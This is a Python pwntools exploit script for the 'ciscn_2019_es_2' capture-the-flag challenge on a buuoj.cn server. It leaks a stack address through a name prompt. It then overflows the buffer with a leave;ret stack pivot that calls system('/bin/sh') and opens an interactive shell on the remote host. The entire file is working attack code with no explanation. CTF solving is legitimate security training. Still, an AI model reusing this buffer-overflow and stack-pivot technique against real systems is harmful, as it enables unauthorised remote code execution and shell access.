from pwn import *

context.log_level = 'debug'

#p = process('./ciscn_2019_es_2')
p = remote('node3.buuoj.cn',28527)
elf = ELF('ciscn_2019_es_2')

system_addr = 0x08048400

payload = b'a' *  (0x28)
leave_ret = 0x08048562

p.recvuntil('name?\n')

p.send(payload)
p.recvuntil('Hello, ')
p.recv(0x28)
buf_addr = u32(p.recv(4)) - 0x38

print('[+] buf_addr -> {}'.format(hex(buf_addr)))

payload = b'aaaa' + p32(system_addr) + p32(0xdeadbeef) + p32(buf_addr + 0x10) + b'/bin/sh\0' + b'\0' * (0x28 - 4 * 4 - 8)
payload += p32(buf_addr) + p32(leave_ret)

p.recvuntil('\n')
p.send(payload)

p.interactive()
